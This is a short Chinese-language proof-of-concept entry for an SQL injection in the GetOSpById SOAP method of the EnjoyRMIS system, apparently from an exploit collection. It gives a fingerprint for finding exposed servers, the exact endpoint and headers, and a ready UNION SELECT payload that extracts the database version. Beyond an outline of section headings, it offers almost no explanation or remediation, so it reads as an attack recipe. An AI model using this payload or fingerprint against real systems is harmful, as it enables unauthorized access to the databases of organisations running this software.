# EnjoyRMISGetOSpById存在SQL注入漏洞

- **系统**：EnjoyRMISGetOSpById　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="CheckSilverlightInstalled"`
- **请求**：`POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: text/xml; charset=utf-8`　`Content-Length: length`　`SOAPAction: "http://tempuri.org/GetOSpById"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetOSpById xmlns="http://tempuri.org/">
<sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
</GetOSpById>
</soap:Body>
</soap:Envelope>

sqlmap\
```

**其他**
- EnjoyRMIS GetOSpById存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * EnjoyRMIS